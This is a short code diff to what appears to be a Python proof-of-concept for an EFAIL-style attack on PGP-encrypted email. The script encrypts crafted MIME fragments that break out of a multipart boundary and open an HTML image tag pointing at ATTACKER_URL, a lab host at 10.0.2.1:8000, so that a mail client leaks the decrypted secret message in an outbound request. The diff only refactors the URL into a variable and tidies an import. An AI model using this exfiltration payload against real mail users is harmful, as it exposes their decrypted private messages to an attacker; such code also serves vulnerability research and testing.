@@ -19,7 +19,7 @@ from email.utils import formatdate
 # Replace with a host you control and can observe requests on (e.g. netcat, requestbin).
 ATTACKER_URL = "http://10.0.2.1:8000"
 
-import pgpy  # noqa: E402  (import after ATTACKER_URL so config stays at top)
+import pgpy
 
 # --- config (no CLI) ---
 SMTP_HOST = "10.0.2.2"
@@ -72,7 +72,7 @@ def main() -> None:
     recipient = recipient_email_from_key(public_key)
     secret = encrypt_inline("secret message: " + os.urandom(10).hex(), public_key)
 
-    armored1 = encrypt_inline("""--separator2--
+    armored1 = encrypt_inline(f"""--separator2--
 
 --separator1
 Content-Type: text/html
@@ -80,7 +80,7 @@ Content-Disposition: inline
 
 <html>
 <body>
-<img src="http://10.0.2.1:8000/
+<img src="{ATTACKER_URL}/
 """, public_key)
     armored2 = encrypt_inline("""
 " />
